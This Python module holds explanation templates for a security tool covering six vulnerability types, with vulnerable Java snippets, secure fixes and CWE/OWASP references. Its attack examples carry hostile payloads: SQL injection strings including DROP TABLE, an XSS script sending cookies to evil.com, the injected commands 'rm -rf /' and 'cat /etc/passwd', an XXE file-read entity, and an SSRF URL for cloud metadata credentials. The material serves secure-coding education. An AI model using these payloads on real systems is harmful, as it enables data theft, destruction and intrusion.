"""Detailed templates for vulnerability explanations.

Provides comprehensive templates for each vulnerability type including:
- Description
- Attack scenario
- Fix strategies (multiple options)
- Code examples (vulnerable and fixed)
- References (CWE, OWASP)
"""

from dataclasses import dataclass
from typing import List, Dict
from src.core.models import VulnerabilityType


@dataclass
class VulnerabilityTemplate:
    """Template for vulnerability explanation."""

    vuln_type: VulnerabilityType
    name: str
    description: str
    attack_scenario: str
    common_pitfalls: List[str]
    fix_strategies: List[Dict[str, str]]  # List of {title, description, code_example}
    secure_patterns: List[str]
    cwe_id: str
    owasp_category: str
    severity_default: str
    references: List[str]


# ============================================================================
# SQL Injection Template
# ============================================================================

SQL_INJECTION_TEMPLATE = VulnerabilityTemplate(
    vuln_type=VulnerabilityType.SQL_INJECTION,
    name="SQL Injection",
    description="""
SQL Injection occurs when untrusted data is concatenated directly into SQL
queries without proper sanitization or parameterization. This allows attackers
to manipulate the query logic, potentially reading, modifying, or deleting
arbitrary database data.
    """.strip(),

    attack_scenario="""
**Attack Example:**

```java
// Vulnerable code
String userId = request.getParameter("id");
String query = "SELECT * FROM users WHERE id = '" + userId + "'";
ResultSet rs = stmt.executeQuery(query);
```

**Exploitation:**
An attacker provides input: `' OR '1'='1` or `'; DROP TABLE users; --`

**Resulting query:**
```sql
SELECT * FROM users WHERE id = '' OR '1'='1'
-- Returns all users instead of one

SELECT * FROM users WHERE id = ''; DROP TABLE users; --'
-- Deletes the entire users table
```
    """.strip(),

    common_pitfalls=[
        "String concatenation in SQL queries",
        "Using user input directly in WHERE clauses",
        "Client-side validation only",
        "Blacklisting special characters (incomplete protection)",
        "Using string escaping instead of parameterized queries",
    ],

    fix_strategies=[
        {
            "title": "1. Parameterized Queries (PreparedStatement) - RECOMMENDED",
            "description": "Use prepared statements to separate SQL code from data. This is the most secure approach.",
            "code_example": """
// SECURE: Using PreparedStatement
String userId = request.getParameter("id");
String query = "SELECT * FROM users WHERE id = ?";
PreparedStatement pstmt = conn.prepareStatement(query);
pstmt.setString(1, userId);  // Automatically escapes and quotes
ResultSet rs = pstmt.executeQuery();
            """.strip()
        },
        {
            "title": "2. ORM Frameworks (JPA, Hibernate)",
            "description": "Use ORM frameworks with parameterized queries to avoid raw SQL.",
            "code_example": """
// SECURE: Using JPA/Hibernate
String userId = request.getParameter("id");
TypedQuery<User> query = em.createQuery(
    "SELECT u FROM User u WHERE u.id = :userId",
    User.class
);
query.setParameter("userId", userId);
User user = query.getSingleResult();
            """.strip()
        },
        {
            "title": "3. Stored Procedures (with parameterization)",
            "description": "Use stored procedures with parameters, not dynamic SQL inside them.",
            "code_example": """
// SECURE: Calling stored procedure
String userId = request.getParameter("id");
CallableStatement cs = conn.prepareCall("{call getUserById(?)}");
cs.setString(1, userId);
ResultSet rs = cs.executeQuery();
            """.strip()
        },
        {
            "title": "4. Input Validation + Whitelisting",
            "description": "Validate inputs against expected patterns (use as additional layer, not replacement for parameterization).",
            "code_example": """
// ADDITIONAL SECURITY: Input validation
String userId = request.getParameter("id");
if (!userId.matches("^[0-9]+$")) {
    throw new IllegalArgumentException("Invalid user ID format");
}
// Still use parameterized query
PreparedStatement pstmt = conn.prepareStatement("SELECT * FROM users WHERE id = ?");
pstmt.setInt(1, Integer.parseInt(userId));
            """.strip()
        },
        {
            "title": "5. Query Builder Libraries (jOOQ, QueryDSL)",
            "description": "Use type-safe query builders that prevent SQL injection by design.",
            "code_example": """
// SECURE: Using jOOQ
String userId = request.getParameter("id");
Result<Record> result = dsl
    .select()
    .from(USERS)
    .where(USERS.ID.eq(userId))
    .fetch();
            """.strip()
        }
    ],

    secure_patterns=[
        "Always use parameterized queries (PreparedStatement)",
        "Never concatenate user input into SQL strings",
        "Validate input format (whitelist approach)",
        "Use least privilege database accounts",
        "Enable query logging and monitoring",
        "Apply principle of least privilege to database users",
    ],

    cwe_id="CWE-89",
    owasp_category="A03:2021 - Injection",
    severity_default="CRITICAL",

    references=[
        "https://owasp.org/www-community/attacks/SQL_Injection",
        "https://cwe.mitre.org/data/definitions/89.html",
        "https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html",
        "https://portswigger.net/web-security/sql-injection",
    ]
)


# ============================================================================
# Cross-Site Scripting (XSS) Template
# ============================================================================

XSS_TEMPLATE = VulnerabilityTemplate(
    vuln_type=VulnerabilityType.XSS,
    name="Cross-Site Scripting (XSS)",
    description="""
Cross-Site Scripting (XSS) occurs when untrusted data is included in web pages
without proper encoding, allowing attackers to inject malicious scripts that
execute in victims' browsers. This can lead to session hijacking, credential
theft, and defacement.
    """.strip(),

    attack_scenario="""
**Attack Example:**

```java
// Vulnerable code
String name = request.getParameter("name");
response.getWriter().write("<h1>Hello, " + name + "</h1>");
```

**Exploitation:**
An attacker provides input: `<script>document.location='http://evil.com/steal?c='+document.cookie</script>`

**Resulting HTML:**
```html
<h1>Hello, <script>document.location='http://evil.com/steal?c='+document.cookie</script></h1>
```

**Impact:**
- Steals user's session cookies
- Can redirect to phishing sites
- Can modify page content
- Can perform actions as the victim user
    """.strip(),

    common_pitfalls=[
        "Outputting user input directly to HTML without encoding",
        "Using innerHTML instead of textContent",
        "Client-side validation only",
        "Incomplete encoding (encoding for HTML but not for JavaScript context)",
        "Trusting data from database without re-encoding",
        "Using unsafe templating functions",
    ],

    fix_strategies=[
        {
            "title": "1. Context-Aware Output Encoding - RECOMMENDED",
            "description": "Encode output based on context (HTML, JavaScript, URL, CSS).",
            "code_example": """
// SECURE: HTML encoding
String name = request.getParameter("name");
String encoded = HtmlUtils.htmlEscape(name);
response.getWriter().write("<h1>Hello, " + encoded + "</h1>");

// Or using JSTL
<c:out value="${param.name}" />

// For JavaScript context
String jsEncoded = JavaScriptUtils.javaScriptEscape(name);
response.getWriter().write("<script>var name = '" + jsEncoded + "';</script>");
            """.strip()
        },
        {
            "title": "2. Content Security Policy (CSP)",
            "description": "Use CSP headers to restrict script execution to trusted sources.",
            "code_example": """
// SECURE: Set CSP header
response.setHeader("Content-Security-Policy",
    "default-src 'self'; script-src 'self' https://trusted-cdn.com; object-src 'none'");

// Or in HTML meta tag
<meta http-equiv="Content-Security-Policy"
      content="default-src 'self'; script-src 'self'">
            """.strip()
        },
        {
            "title": "3. Template Engines with Auto-Escaping",
            "description": "Use modern template engines that auto-escape by default (Thymeleaf, Freemarker with proper config).",
            "code_example": """
<!-- SECURE: Thymeleaf auto-escapes by default -->
<h1>Hello, <span th:text="${name}">User</span></h1>

<!-- If you need unescaped (use with extreme caution) -->
<div th:utext="${trustedHtml}"></div>
            """.strip()
        },
        {
            "title": "4. HTTPOnly and Secure Cookies",
            "description": "Protect session cookies from XSS with HTTPOnly flag.",
            "code_example": """
// SECURE: Set HTTPOnly and Secure flags
Cookie cookie = new Cookie("sessionId", sessionId);
cookie.setHttpOnly(true);  // Prevents JavaScript access
cookie.setSecure(true);    // HTTPS only
cookie.setSameSite("Strict"); // CSRF protection
response.addCookie(cookie);
            """.strip()
        },
        {
            "title": "5. Input Validation + Sanitization",
            "description": "Validate and sanitize input (use as additional layer, not replacement).",
            "code_example": """
// ADDITIONAL SECURITY: Input validation
String name = request.getParameter("name");
// Allow only alphanumeric and spaces
if (!name.matches("^[a-zA-Z0-9 ]+$")) {
    throw new IllegalArgumentException("Invalid name format");
}
// Still encode on output
String encoded = HtmlUtils.htmlEscape(name);
            """.strip()
        }
    ],

    secure_patterns=[
        "Always encode output based on context",
        "Use auto-escaping template engines",
        "Implement Content Security Policy (CSP)",
        "Set HTTPOnly and Secure flags on cookies",
        "Validate input format (whitelist approach)",
        "Use textContent instead of innerHTML in JavaScript",
        "Never use eval() or similar functions with user input",
    ],

    cwe_id="CWE-79",
    owasp_category="A03:2021 - Injection",
    severity_default="MEDIUM",

    references=[
        "https://owasp.org/www-community/attacks/xss/",
        "https://cwe.mitre.org/data/definitions/79.html",
        "https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html",
        "https://portswigger.net/web-security/cross-site-scripting",
    ]
)


# ============================================================================
# Command Injection Template
# ============================================================================

COMMAND_INJECTION_TEMPLATE = VulnerabilityTemplate(
    vuln_type=VulnerabilityType.COMMAND_INJECTION,
    name="Command Injection",
    description="""
Command Injection occurs when untrusted data is passed to system command
execution functions without proper sanitization. This allows attackers to
execute arbitrary commands on the server, potentially leading to complete
system compromise.
    """.strip(),

    attack_scenario="""
**Attack Example:**

```java
// Vulnerable code
String filename = request.getParameter("file");
Runtime.getRuntime().exec("cat " + filename);
```

**Exploitation:**
An attacker provides input: `file.txt; rm -rf /` or `file.txt && cat /etc/passwd`

**Resulting command:**
```bash
cat file.txt; rm -rf /
# Deletes all files on the system!

cat file.txt && cat /etc/passwd
# Reads sensitive system files
```
    """.strip(),

    common_pitfalls=[
        "String concatenation in command execution",
        "Using shell=True or shell interpreters",
        "Insufficient input validation",
        "Allowing shell metacharacters (;, &&, ||, |, etc.)",
        "Using Runtime.exec() with string instead of array",
    ],

    fix_strategies=[
        {
            "title": "1. Avoid System Commands - RECOMMENDED",
            "description": "Use native Java APIs instead of system commands whenever possible.",
            "code_example": """
// SECURE: Use Java APIs instead of system commands
String filename = request.getParameter("file");

// Instead of: Runtime.getRuntime().exec("cat " + filename);
// Use Java file I/O:
Path path = Paths.get("/safe/dir", filename).normalize();
if (!path.startsWith("/safe/dir")) {
    throw new SecurityException("Path traversal attempt");
}
String content = Files.readString(path);
            """.strip()
        },
        {
            "title": "2. Command Array (No Shell Interpretation)",
            "description": "Use command arrays to prevent shell interpretation.",
            "code_example": """
// SECURE: Use array form (no shell)
String filename = request.getParameter("file");
String[] command = {"cat", filename};  // No shell interpretation
Process process = Runtime.getRuntime().exec(command);

// Or using ProcessBuilder (preferred)
ProcessBuilder pb = new ProcessBuilder("cat", filename);
pb.redirectErrorStream(true);
Process process = pb.start();
            """.strip()
        },
        {
            "title": "3. Strict Input Whitelisting",
            "description": "Validate input against strict whitelist of allowed values.",
            "code_example": """
// SECURE: Whitelist allowed filenames
String filename = request.getParameter("file");
List<String> allowedFiles = Arrays.asList("report.txt", "summary.txt", "data.txt");

if (!allowedFiles.contains(filename)) {
    throw new IllegalArgumentException("File not allowed");
}

String[] command = {"cat", filename};
Process process = Runtime.getRuntime().exec(command);
            """.strip()
        },
        {
            "title": "4. Command Sanitization Library",
            "description": "Use libraries designed for safe command execution.",
            "code_example": """
// SECURE: Using Apache Commons Exec
String filename = request.getParameter("file");

CommandLine cmdLine = new CommandLine("cat");
cmdLine.addArgument(filename, true);  // true = handle quoting

DefaultExecutor executor = new DefaultExecutor();
executor.execute(cmdLine);
            """.strip()
        },
        {
            "title": "5. Sandboxing and Least Privilege",
            "description": "Run commands with minimal privileges in sandboxed environment.",
            "code_example": """
// SECURE: Run with restricted permissions
String filename = request.getParameter("file");

ProcessBuilder pb = new ProcessBuilder("cat", filename);
pb.directory(new File("/restricted/directory"));

// Set environment variables
Map<String, String> env = pb.environment();
env.clear();  // Clear all env vars
env.put("HOME", "/nonexistent");

Process process = pb.start();
            """.strip()
        }
    ],

    secure_patterns=[
        "Avoid system commands when possible - use native APIs",
        "Use command arrays instead of strings",
        "Never use shell interpreters with user input",
        "Whitelist allowed commands and arguments",
        "Run commands with minimal privileges",
        "Reject input containing shell metacharacters",
        "Use specialized libraries like Apache Commons Exec",
    ],

    cwe_id="CWE-78",
    owasp_category="A03:2021 - Injection",
    severity_default="CRITICAL",

    references=[
        "https://owasp.org/www-community/attacks/Command_Injection",
        "https://cwe.mitre.org/data/definitions/78.html",
        "https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html",
        "https://portswigger.net/web-security/os-command-injection",
    ]
)


# ============================================================================
# Path Traversal Template
# ============================================================================

PATH_TRAVERSAL_TEMPLATE = VulnerabilityTemplate(
    vuln_type=VulnerabilityType.PATH_TRAVERSAL,
    name="Path Traversal",
    description="""
Path Traversal (Directory Traversal) occurs when user input is used to construct
file paths without proper validation, allowing attackers to access files outside
the intended directory. This can lead to reading sensitive files, overwriting
critical files, or code execution.
    """.strip(),

    attack_scenario="""
**Attack Example:**

```java
// Vulnerable code
String filename = request.getParameter("file");
File file = new File("/app/uploads/" + filename);
FileInputStream fis = new FileInputStream(file);
```

**Exploitation:**
An attacker provides input: `../../etc/passwd` or `..\\..\\windows\\system32\\config\\sam`

**Resulting path:**
```
/app/uploads/../../etc/passwd
→ /etc/passwd (sensitive system file)
```
    """.strip(),

    common_pitfalls=[
        "Concatenating user input directly into file paths",
        "Insufficient validation of path traversal sequences",
        "Not canonicalizing paths before validation",
        "Allowing backslashes on Windows",
        "Trusting filename extensions",
        "Not checking if final path is within allowed directory",
    ],

    fix_strategies=[
        {
            "title": "1. Path Canonicalization + Prefix Check - RECOMMENDED",
            "description": "Normalize paths and verify they stay within allowed directory.",
            "code_example": """
// SECURE: Canonicalize and validate
String filename = request.getParameter("file");
Path basePath = Paths.get("/app/uploads").toRealPath();
Path filePath = basePath.resolve(filename).normalize();

// Check if resolved path is still inside base directory
if (!filePath.startsWith(basePath)) {
    throw new SecurityException("Path traversal attempt detected");
}

// Safe to use
Files.readAllBytes(filePath);
            """.strip()
        },
        {
            "title": "2. Filename Whitelist",
            "description": "Only allow pre-defined set of filenames.",
            "code_example": """
// SECURE: Whitelist approach
String filename = request.getParameter("file");
Set<String> allowedFiles = Set.of("report.pdf", "summary.txt", "data.csv");

if (!allowedFiles.contains(filename)) {
    throw new IllegalArgumentException("File not allowed");
}

File file = new File("/app/uploads/" + filename);
            """.strip()
        },
        {
            "title": "3. Strict Pattern Validation",
            "description": "Validate filename against strict pattern (alphanumeric + safe chars only).",
            "code_example": """
// SECURE: Pattern validation
String filename = request.getParameter("file");

// Allow only alphanumeric, dash, underscore, dot
if (!filename.matches("^[a-zA-Z0-9._-]+$")) {
    throw new IllegalArgumentException("Invalid filename");
}

// Reject path traversal sequences
if (filename.contains("..") || filename.contains("/") || filename.contains("\\\\")) {
    throw new SecurityException("Path traversal detected");
}

File file = new File("/app/uploads/" + filename);
            """.strip()
        },
        {
            "title": "4. Use File ID Instead of Name",
            "description": "Map user-provided IDs to actual filenames server-side.",
            "code_example": """
// SECURE: Use file mapping
String fileId = request.getParameter("fileId");

// Server-side mapping
Map<String, String> fileMapping = Map.of(
    "1", "report_2024.pdf",
    "2", "summary_q1.txt",
    "3", "data_export.csv"
);

String actualFilename = fileMapping.get(fileId);
if (actualFilename == null) {
    throw new IllegalArgumentException("Invalid file ID");
}

File file = new File("/app/uploads/" + actualFilename);
            """.strip()
        },
        {
            "title": "5. Chroot Jail / Sandboxing",
            "description": "Restrict file operations to specific directory using chroot or containerization.",
            "code_example": """
// SECURE: Use Java SecurityManager (limited)
String filename = request.getParameter("file");

// Set security policy to restrict file access
System.setSecurityManager(new SecurityManager());

// Or use containerization (Docker, etc.)
// to isolate file system access
            """.strip()
        }
    ],

    secure_patterns=[
        "Always canonicalize and normalize paths",
        "Verify resolved path is within allowed directory",
        "Use file IDs instead of filenames when possible",
        "Reject path traversal sequences (../, ..\\)",
        "Validate filenames against strict patterns",
        "Use whitelist of allowed files",
        "Never trust user-provided file extensions",
    ],

    cwe_id="CWE-22",
    owasp_category="A01:2021 - Broken Access Control",
    severity_default="HIGH",

    references=[
        "https://owasp.org/www-community/attacks/Path_Traversal",
        "https://cwe.mitre.org/data/definitions/22.html",
        "https://portswigger.net/web-security/file-path-traversal",
    ]
)


# ============================================================================
# XXE (XML External Entity) Template
# ============================================================================

XXE_TEMPLATE = VulnerabilityTemplate(
    vuln_type=VulnerabilityType.XXE,
    name="XML External Entity (XXE)",
    description="""
XXE vulnerabilities occur when XML parsers process external entity references
without proper configuration. This allows attackers to read local files,
perform SSRF attacks, or cause denial of service.
    """.strip(),

    attack_scenario="""
**Attack Example:**

```java
// Vulnerable code
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
DocumentBuilder db = dbf.newDocumentBuilder();
Document doc = db.parse(new InputSource(new StringReader(xmlInput)));
```

**Exploitation:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<data>&xxe;</data>
```

**Result:** Reads and returns contents of /etc/passwd
    """.strip(),

    common_pitfalls=[
        "Default XML parser configurations (often insecure)",
        "Enabling DTD processing",
        "Allowing external entity expansion",
        "Not disabling external general entities",
        "Using old XML parser libraries",
    ],

    fix_strategies=[
        {
            "title": "1. Disable External Entities - RECOMMENDED",
            "description": "Configure XML parser to disable all external entity processing.",
            "code_example": """
// SECURE: Disable external entities
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();

// Disable DTDs completely
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);

// Or if DTDs are needed, disable external entities
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
dbf.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);

// Disable XInclude
dbf.setXIncludeAware(false);

// Disable expand entity references
dbf.setExpandEntityReferences(false);

DocumentBuilder db = dbf.newDocumentBuilder();
            """.strip()
        },
        {
            "title": "2. Use Safe Parser (JAXB, Jackson)",
            "description": "Use modern libraries with secure defaults.",
            "code_example": """
// SECURE: Using Jackson XML
XmlMapper xmlMapper = new XmlMapper();
xmlMapper.configure(
    FromXmlParser.Feature.EMPTY_ELEMENT_AS_NULL,
    false
);

// Jackson disables external entities by default
MyObject obj = xmlMapper.readValue(xmlInput, MyObject.class);
            """.strip()
        }
    ],

    secure_patterns=[
        "Disable DOCTYPE declarations entirely",
        "Disable external general entities",
        "Disable external parameter entities",
        "Disable external DTD loading",
        "Use safe XML libraries with secure defaults",
    ],

    cwe_id="CWE-611",
    owasp_category="A05:2021 - Security Misconfiguration",
    severity_default="HIGH",

    references=[
        "https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing",
        "https://cwe.mitre.org/data/definitions/611.html",
        "https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html",
    ]
)


# ============================================================================
# SSRF (Server-Side Request Forgery) Template
# ============================================================================

SSRF_TEMPLATE = VulnerabilityTemplate(
    vuln_type=VulnerabilityType.SSRF,
    name="Server-Side Request Forgery (SSRF)",
    description="""
SSRF vulnerabilities occur when an application makes HTTP requests to
user-controlled URLs without proper validation. This allows attackers to
make requests to internal systems, cloud metadata services, or other targets
not directly accessible to the attacker.
    """.strip(),

    attack_scenario="""
**Attack Example:**

```java
// Vulnerable code
String url = request.getParameter("url");
URL target = new URL(url);
HttpURLConnection conn = (HttpURLConnection) target.openConnection();
```

**Exploitation:**
```
http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

**Result:** Reads AWS credentials from metadata service
    """.strip(),

    common_pitfalls=[
        "No URL validation",
        "Allowing access to internal IP ranges",
        "Not blocking cloud metadata endpoints",
        "Following redirects to internal URLs",
        "DNS rebinding vulnerabilities",
    ],

    fix_strategies=[
        {
            "title": "1. URL Whitelist - RECOMMENDED",
            "description": "Only allow requests to pre-approved domains.",
            "code_example": """
// SECURE: URL whitelist
String urlStr = request.getParameter("url");
URL url = new URL(urlStr);

Set<String> allowedHosts = Set.of("api.example.com", "cdn.example.com");
if (!allowedHosts.contains(url.getHost())) {
    throw new SecurityException("Host not allowed");
}

HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            """.strip()
        },
        {
            "title": "2. Block Internal IPs",
            "description": "Reject requests to private IP ranges and localhost.",
            "code_example": """
// SECURE: Block internal IPs
String urlStr = request.getParameter("url");
URL url = new URL(urlStr);
InetAddress addr = InetAddress.getByName(url.getHost());

if (addr.isLoopbackAddress() ||
    addr.isLinkLocalAddress() ||
    addr.isSiteLocalAddress()) {
    throw new SecurityException("Internal IP not allowed");
}
            """.strip()
        }
    ],

    secure_patterns=[
        "Use URL whitelist",
        "Block internal IP ranges",
        "Disable HTTP redirects or validate redirect targets",
        "Block cloud metadata endpoints",
        "Use separate network for outbound requests",
    ],

    cwe_id="CWE-918",
    owasp_category="A10:2021 - Server-Side Request Forgery",
    severity_default="HIGH",

    references=[
        "https://owasp.org/www-community/attacks/Server_Side_Request_Forgery",
        "https://cwe.mitre.org/data/definitions/918.html",
        "https://portswigger.net/web-security/ssrf",
    ]
)


# ============================================================================
# Template Registry
# ============================================================================

TEMPLATE_REGISTRY: Dict[VulnerabilityType, VulnerabilityTemplate] = {
    VulnerabilityType.SQL_INJECTION: SQL_INJECTION_TEMPLATE,
    VulnerabilityType.XSS: XSS_TEMPLATE,
    VulnerabilityType.COMMAND_INJECTION: COMMAND_INJECTION_TEMPLATE,
    VulnerabilityType.PATH_TRAVERSAL: PATH_TRAVERSAL_TEMPLATE,
    VulnerabilityType.XXE: XXE_TEMPLATE,
    VulnerabilityType.SSRF: SSRF_TEMPLATE,
}


def get_template(vuln_type: VulnerabilityType) -> VulnerabilityTemplate:
    """Get template for vulnerability type.

    Args:
        vuln_type: Vulnerability type.

    Returns:
        VulnerabilityTemplate for the type.

    Raises:
        KeyError: If no template exists for this type.
    """
    return TEMPLATE_REGISTRY[vuln_type]
